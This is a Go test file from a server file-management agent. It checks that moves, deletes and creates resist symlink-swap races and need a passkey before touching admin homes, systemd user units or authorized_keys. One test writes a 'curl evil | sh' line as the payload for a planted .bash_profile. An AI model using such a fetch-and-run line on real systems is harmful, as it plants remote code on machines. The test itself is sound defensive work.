// SPDX-License-Identifier: AGPL-3.0-only

// From #290's review: a link swapped in as a call acts, a home reached through a
// link, an admin's units outside /home, and Recently deleted beside its own cleanup.

package files

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"golang.org/x/sys/unix"

	agentv1 "github.com/dockwell/dockwell/gen/dockwell/agent/v1"
	dockwellv1 "github.com/dockwell/dockwell/gen/dockwell/v1"
)

// swapAt replaces dir with a link to elsewhere the moment a call touches at, once.
func swapAt(t *testing.T, d *fakeDisk, at, dir, elsewhere string) *atomic.Bool {
	t.Helper()
	var swapped atomic.Bool
	d.server.Touching = func(p string) {
		if p == at && swapped.CompareAndSwap(false, true) {
			if err := os.Rename(dir, dir+"-real"); err != nil {
				t.Errorf("rename: %v", err)
			}
			if err := os.Symlink(elsewhere, dir); err != nil {
				t.Errorf("symlink: %v", err)
			}
		}
	}
	return &swapped
}

func TestReviewLinkSwappedMidMake(t *testing.T) {
	d := newDisk(t)
	d.noAccounts()
	dir := filepath.Join(d.root, "site", "dir")
	outside := filepath.Join(d.root, "outside")
	write(t, filepath.Join(dir, "x"), "x")
	write(t, filepath.Join(outside, "keep"), "keep")
	swapped := swapAt(t, d, filepath.Join(dir, "new"), dir, outside)
	got := d.make(t, filepath.Join(dir, "new"), dockwellv1.FileType_FILE_TYPE_FILE, "")
	if !swapped.Load() {
		t.Fatal("never swapped")
	}
	if there(filepath.Join(outside, "new")) {
		t.Errorf("made through the link swapped in: %v", got)
	}
	if !there(filepath.Join(dir+"-real", "new")) {
		t.Error("not made in the folder that was checked")
	}
}

func TestReviewLinkSwappedMidMoveDest(t *testing.T) {
	d := newDisk(t)
	d.noAccounts()
	src := filepath.Join(d.root, "site", "a.txt")
	dir := filepath.Join(d.root, "site", "dest")
	outside := filepath.Join(d.root, "outside")
	write(t, src, "a")
	write(t, filepath.Join(dir, "x"), "x")
	write(t, filepath.Join(outside, "keep"), "keep")
	swapped := swapAt(t, d, filepath.Join(dir, "a.txt"), dir, outside)
	got := d.move(t, src, filepath.Join(dir, "a.txt"), "", "")
	if !swapped.Load() {
		t.Fatal("never swapped")
	}
	if there(filepath.Join(outside, "a.txt")) {
		t.Errorf("moved through the link swapped in: %v", got)
	}
}

func TestReviewLinkSwappedMidDelete(t *testing.T) {
	for _, forGood := range []bool{false, true} {
		d := newDisk(t)
		d.noAccounts()
		dir := filepath.Join(d.root, "site", "dir")
		outside := filepath.Join(d.root, "outside")
		write(t, filepath.Join(dir, "victim"), "checked")
		write(t, filepath.Join(outside, "victim"), "precious")
		swapped := swapAt(t, d, filepath.Join(dir, "victim"), dir, outside)
		got := d.delete(t, filepath.Join(dir, "victim"), forGood, "")
		if !swapped.Load() {
			t.Fatal("never swapped")
		}
		if !there(filepath.Join(outside, "victim")) {
			t.Errorf("deleted through the link swapped in, for good %v: %v", forGood, got)
		}
	}
}

// adminAccounts gives one account in sudo, with home, and others as plain.
func (d *fakeDisk) adminAccounts(admin string, others ...string) {
	passwd := "deploy:x:1500:27::" + admin + ":/bin/sh\n"
	for i, h := range others {
		passwd += "user" + itoa(i) + ":x:" + itoa(2000+i) + ":" + itoa(2000+i) + "::" + h + ":/bin/sh\n"
	}
	d.server.accounts = func() (string, string) { return passwd, "sudo:x:27:\n" }
}

// An admin's home outside /home: a folder that becomes or holds their systemd user dir.
func TestReviewFolderBecomesAnAdminsUserUnits(t *testing.T) {
	d := newDisk(t)
	home := filepath.Join(d.root, "srv", "deploy")
	write(t, filepath.Join(home, "notes.txt"), "n")
	d.adminAccounts(home)
	stage := filepath.Join(d.root, "stage")
	write(t, filepath.Join(stage, "systemd", "user", "default.target.d", "x.conf"), "[Unit]\nWants=evil.service\n")
	write(t, filepath.Join(stage, "systemd", "user", "evil.service"), "[Service]\nExecStart=/bin/true\n")

	// Control: a file into the user units folder asks.
	write(t, filepath.Join(d.root, "loose.service"), "[Service]\n")
	if err := os.MkdirAll(filepath.Join(home, ".config", "systemd", "user"), 0o755); err != nil {
		t.Fatal(err)
	}
	if r := d.move(t, filepath.Join(d.root, "loose.service"), filepath.Join(home, ".config", "systemd", "user", "loose.service"), "", "").GetRefusal(); r.GetKind() != agentv1.FileRefusal_KIND_NEEDS_STEP_UP {
		t.Errorf("control: a file into user units: %v", r)
	}
	// A folder that holds the admin's user units, moved out and back.
	away := d.move(t, filepath.Join(home, ".config"), filepath.Join(d.root, "cfg"), "", "")
	if away.GetRefusal().GetKind() != agentv1.FileRefusal_KIND_NEEDS_STEP_UP {
		t.Errorf("moved a folder that holds an admin's user units with no passkey: %v", away)
	}
	_ = os.RemoveAll(filepath.Join(home, ".config"))
	_ = os.RemoveAll(filepath.Join(d.root, "cfg"))

	for _, to := range []string{filepath.Join(home, ".config")} {
		if got := d.move(t, stage, to, "", ""); got.GetRefusal().GetKind() != agentv1.FileRefusal_KIND_NEEDS_STEP_UP {
			t.Errorf("a folder moved to %s, so it holds the admin's user units, asked nothing: %v", to, got)
		}
	}
}

// A home reached through a link, as /home -> /var/home on an ostree server.
func TestReviewAHomeBehindALink(t *testing.T) {
	d := newDisk(t)
	real := filepath.Join(d.root, "var", "home")
	write(t, filepath.Join(real, "alice", "notes.txt"), "n")
	write(t, filepath.Join(real, "deploy", ".bashrc"), "# rc")
	link(t, real, filepath.Join(d.root, "home"))
	alice := filepath.Join(d.root, "home", "alice")
	d.adminAccounts(filepath.Join(d.root, "home", "deploy"), alice)

	if got := d.delete(t, alice, false, ""); got.GetRefusal().GetKind() != agentv1.FileRefusal_KIND_NEEDS_STEP_UP {
		t.Errorf("deleted an account's home, reached through a link, with no passkey: %v", got)
	}
	write(t, filepath.Join(d.root, "profile"), "curl evil | sh\n")
	moved := d.move(t, filepath.Join(d.root, "profile"), filepath.Join(d.root, "home", "deploy", ".bash_profile"), "", "")
	if moved.GetRefusal().GetKind() != agentv1.FileRefusal_KIND_NEEDS_STEP_UP {
		t.Errorf("planted an admin's .bash_profile, through a link in their home's path, with no passkey: %v", moved)
	}
}

// An entry that doesn't say what it is yet may be being made, so it stays out of the
// list, and a prune leaves it an hour.
func TestReviewPruneTakesAnEntryBeingMade(t *testing.T) {
	d := newDisk(t)
	d.noAccounts()
	// What an entry is between its mkdir and its about.json.
	entry := filepath.Join(d.server.deletedDir(), strings.Repeat("B", 26))
	if err := os.MkdirAll(entry, 0o700); err != nil {
		t.Fatal(err)
	}
	d.server.prune(t.Context())
	if left := deletedEntries(t, d); len(left) != 1 {
		t.Errorf("an entry being made was pruned: %v", left)
	}
	if listed, _ := d.server.ListDeleted(); len(listed.GetListing().GetDeleted()) != 0 {
		t.Errorf("an entry that says nothing is listed: %v", listed)
	}
	// One a stop left half made goes, an hour on.
	then := time.Now().Add(-2 * time.Hour)
	if err := os.Chtimes(entry, then, then); err != nil {
		t.Fatal(err)
	}
	d.server.prune(t.Context())
	if left := deletedEntries(t, d); len(left) != 0 {
		t.Errorf("a half-made entry an hour old stayed: %v", left)
	}
}

func TestReviewPruneRacesDelete(t *testing.T) {
	d := newDisk(t)
	d.noAccounts()
	site := filepath.Join(d.root, "site")
	const n = 400
	for i := range n {
		write(t, filepath.Join(site, "f"+itoa(i)), "keep me")
	}
	ctx, cancel := context.WithCancel(t.Context())
	var wg sync.WaitGroup
	wg.Go(func() {
		for ctx.Err() == nil {
			d.server.prune(ctx)
		}
	})
	var ids []string
	for i := range n {
		got := d.delete(t, filepath.Join(site, "f"+itoa(i)), false, "")
		if k := got.GetDeleted().GetDeleted(); k != nil {
			ids = append(ids, k.GetId())
		} else if i < 3 {
			t.Logf("not kept: %v", got)
		}
	}
	cancel()
	wg.Wait()
	lost := 0
	for _, id := range ids {
		if !there(filepath.Join(d.server.deletedDir(), id, itemName)) {
			lost++
		}
	}
	if len(ids) != n || lost > 0 {
		t.Errorf("deleted %d, said kept %d, then removed for good %d", n, len(ids), lost)
	}
}

// What a move checked is swapped for something else just before the rename.
func TestReviewSourceSwappedMidMove(t *testing.T) {
	d := newDisk(t)
	d.noAccounts()
	site := filepath.Join(d.root, "site")
	src := filepath.Join(site, "a.txt")
	write(t, src, "checked")
	write(t, filepath.Join(site, "other.txt"), "swapped in")
	to := filepath.Join(d.root, "dest", "a.txt")
	if err := os.MkdirAll(filepath.Dir(to), 0o755); err != nil {
		t.Fatal(err)
	}
	var done atomic.Bool
	d.server.Touching = func(p string) {
		if p == to && done.CompareAndSwap(false, true) {
			_ = os.Rename(src, filepath.Join(site, "a-was.txt"))
			_ = os.Rename(filepath.Join(site, "other.txt"), src)
		}
	}
	if got := d.move(t, src, to, "", ""); got.GetRefusal().GetKind() != agentv1.FileRefusal_KIND_CHANGED || there(to) {
		t.Errorf("what moved wasn't what was checked, and it stayed moved: %v", got)
	}
	if text, _ := os.ReadFile(src); string(text) != "swapped in" {
		t.Errorf("what was swapped in isn't back: %q", text)
	}
}

// Where the home root leads somewhere else, as /home does to /var/home on an ostree
// system, what's in it counts by the rule for /home: an account's home asks, and a
// folder in one doesn't.
func TestReviewTheHomeRootBehindALink(t *testing.T) {
	d := newDisk(t)
	d.noAccounts()
	real := filepath.Join(d.root, "var", "home")
	write(t, filepath.Join(real, "bob", "site", "index.html"), "hi")
	link(t, real, filepath.Join(d.root, "home"))
	d.server.homeRoot = filepath.Join(d.root, "home")
	if got := d.delete(t, filepath.Join(real, "bob"), false, ""); got.GetRefusal().GetKind() != agentv1.FileRefusal_KIND_NEEDS_STEP_UP {
		t.Errorf("deleted a home under where the home root leads, with no passkey: %v", got)
	}
	if got := d.delete(t, filepath.Join(real, "bob", "site", "index.html"), false, ""); got.GetDeleted() == nil {
		t.Errorf("a file in a home asks: %v", got)
	}
}

// What a removal checked is what it removes: something else in its place stays.
func TestRemovingGoesByWhatWasChecked(t *testing.T) {
	d := newDisk(t)
	dir := filepath.Join(d.root, "site")
	write(t, filepath.Join(dir, "x", "keep"), "keep")
	fd, err := unix.Open(dir, unix.O_PATH|unix.O_DIRECTORY|unix.O_CLOEXEC, 0)
	if err != nil {
		t.Fatal(err)
	}
	defer unix.Close(fd)
	var st unix.Stat_t
	if err := unix.Stat(filepath.Join(dir, "x"), &st); err != nil {
		t.Fatal(err)
	}
	if err := removeAll(fd, "x", st.Dev, st.Ino+1, 0); err == nil || !there(filepath.Join(dir, "x", "keep")) {
		t.Errorf("removed what wasn't what was checked: %v", err)
	}
	if err := removeAll(fd, "x", st.Dev, st.Ino, 0); err != nil || there(filepath.Join(dir, "x")) {
		t.Errorf("didn't remove what was checked: %v", err)
	}
	// A file too, which goes by its name, so it's checked first.
	write(t, filepath.Join(dir, "f"), "keep")
	if err := unix.Stat(filepath.Join(dir, "f"), &st); err != nil {
		t.Fatal(err)
	}
	if err := removeAll(fd, "f", st.Dev, st.Ino+1, 0); err == nil || !there(filepath.Join(dir, "f")) {
		t.Errorf("removed a file that wasn't what was checked: %v", err)
	}
}

// Putting back into a folder that's gone says so, and what to do.
func TestPuttingBackIntoAFolderThatsGone(t *testing.T) {
	d := newDisk(t)
	d.noAccounts()
	folder := filepath.Join(d.root, "site", "old")
	write(t, filepath.Join(folder, "a.txt"), "a")
	kept := d.delete(t, filepath.Join(folder, "a.txt"), false, "").GetDeleted().GetDeleted()
	if err := os.Remove(folder); err != nil {
		t.Fatal(err)
	}
	got, err := d.server.Restore(t.Context(), kept.GetId(), "")
	if err != nil {
		t.Fatal(err)
	}
	if r := got.GetRefusal(); r.GetKind() != agentv1.FileRefusal_KIND_FOLDER_GONE || !strings.Contains(r.GetMessage(), "Make the folder again first") {
		t.Errorf("= %v", r)
	}
	if listed, _ := d.server.ListDeleted(); len(listed.GetListing().GetDeleted()) != 1 {
		t.Errorf("it isn't in Recently deleted still: %v", listed)
	}
}

// A delete that can't be put back says so before it asks for a passkey, so one
// delete takes one.
func TestADeleteOnAnotherDiskSaysSoBeforeAPasskey(t *testing.T) {
	d := newDisk(t)
	elsewhere, err := os.MkdirTemp("/dev/shm", "dockwell-test-")
	if err != nil {
		t.Skipf("no /dev/shm here: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(elsewhere) })
	var a, b unix.Stat_t
	if unix.Stat(elsewhere, &a) != nil || unix.Stat(d.root, &b) != nil || a.Dev == b.Dev {
		t.Skip("/dev/shm is on the same filesystem as the test's folder here")
	}
	d.server = New(elsewhere, nil, func(context.Context) (string, error) { return d.docker, nil })
	d.noAccounts()
	keys := filepath.Join(d.root, ".ssh", "authorized_keys")
	write(t, keys, "ssh-ed25519 AAAA admin\n")
	if got := d.delete(t, keys, false, "").GetRefusal(); got.GetKind() != agentv1.FileRefusal_KIND_FOR_GOOD {
		t.Errorf("= %v", got)
	}
	if got := d.delete(t, keys, true, "").GetRefusal(); got.GetKind() != agentv1.FileRefusal_KIND_NEEDS_STEP_UP {
		t.Errorf("for good, with no passkey = %v", got)
	}
}

// What can't be written says what to do about it by why.
func TestAWriteTheKernelRefusesSaysWhatToDo(t *testing.T) {
	for err, says := range map[error]string{
		unix.EACCES: "chattr", unix.EPERM: "chattr", unix.ENOSPC: "free space", unix.EDQUOT: "quota", unix.EROFS: "read-only", unix.EIO: "permissions",
	} {
		if got := fixFor(err); !strings.Contains(got, says) {
			t.Errorf("fixFor(%v) = %q, want it to say %q", err, got, says)
		}
	}
}
